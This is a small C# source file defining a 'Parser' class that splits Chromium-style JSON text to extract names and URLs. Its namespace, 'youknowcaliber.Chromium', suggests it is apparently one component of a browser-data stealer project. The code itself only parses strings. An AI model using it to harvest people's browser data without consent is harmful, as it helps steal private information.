﻿using System;
using System.Text.RegularExpressions;

namespace youknowcaliber.Chromium
{
	internal sealed class Parser
	{
		public static string RemoveLatest(string data)
		{
			return Regex.Split(Regex.Split(data, "\",")[0], "\"")[0];
		}

		public static bool DetectTitle(string data)
		{
			return data.Contains("\"name");
		}

		public static string Get(string data, int index)
		{
			string result;
			try
			{
				result = Parser.RemoveLatest(Regex.Split(data, Parser.separator)[index]);
			}
			catch (IndexOutOfRangeException)
			{
				result = "Failed to parse url";
			}
			return result;
		}

		public static string separator = "\": \"";
	}
}
